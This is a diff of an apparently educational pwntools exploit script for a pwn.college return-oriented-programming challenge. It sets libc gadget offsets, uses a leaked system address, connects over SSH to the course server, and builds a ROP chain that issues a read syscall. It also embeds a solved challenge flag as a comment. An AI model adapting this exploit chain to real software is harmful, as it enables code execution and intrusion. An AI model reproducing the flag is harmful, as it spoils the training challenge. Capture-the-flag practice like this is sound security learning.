@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+#pwn_college{Ao9MRny5LwUrZrnFzyO2AP3YS23.dZjNywCN2gzW}
 #python3 solution.py
 
 from pwn import *
@@ -6,28 +7,20 @@ from pwn import *
 local = False
 #local = True
 
-if local:
-    #static addresses in libc:
-    target_address_1 = 0x3ee88 #pop rax; ret;
-    target_address_2 = 0x26796 #pop rdi; ret;
-    target_address_3 = 0x2890f #pop rsi; ret;
-    target_address_4 = 0xcb1cd #pop rdx; ret;
-    target_address_5 = 0x81d0c #syscall; ret;
-    static_system_addr = 0x48e50
+#static addresses in libc:
+target_address_1 = 0x4a550 #pop rax; ret;
+target_address_2 = 0x26b72 #pop rdi; ret;
+target_address_3 = 0x27529 #pop rsi; ret;
+target_address_4 = 0x11c371 #pop rdx ; pop r12 ; ret
+target_address_5 = 0x66229 #syscall; ret;
+static_system_addr = 0x55410
 
+if local:
     p = process("./babyrop_level7_testing1")
     raw_input("attach gdb")
 else:
-    #static addresses in libc:
-    target_address_1 = 0x4a550 #pop rax; ret;
-    target_address_2 = 0x26b72 #pop rdi; ret;
-    target_address_3 = 0x27529 #pop rsi; ret;
-    target_address_4 = 0x11c371 #pop rdx ; pop r12 ; ret
-    target_address_5 = 0x941a4 #syscall; ret;
-    static_system_addr = 0x55410
     s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
     p = s.process("./babyrop_level7_testing1")
-    raw_input("attach gdb")
 
 
 p.recvuntil("[LEAK] The address of \"system\" in libc is: ")
@@ -51,12 +44,12 @@ target_address_5 += libc_base_addr
 pad = b'A' * cyclic_find("laaaaaaa", n=8)
 
 
-data_section="0x405500" # known memory address where flag's filename and flag content gets copied
+data_section="0x405500" # known memory address where flag's filename and later flag content gets copied
 r12 = 0x00 # bogus, just to satisfy target_address_4
 
 rax = 0x00 # read syscall
 rdi = 0x00 # read from stdin
-rsi = int(data_section, 16) # known memory address where flag's filename and flag content gets copied
+rsi = int(data_section, 16) # known memory address where flag's filename and later flag content gets copied
 rdx = 0x08 # 8B flag
 payload = pad + p64(target_address_1) + p64(rax) + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(r12) + p64(target_address_5) # read syscall
 
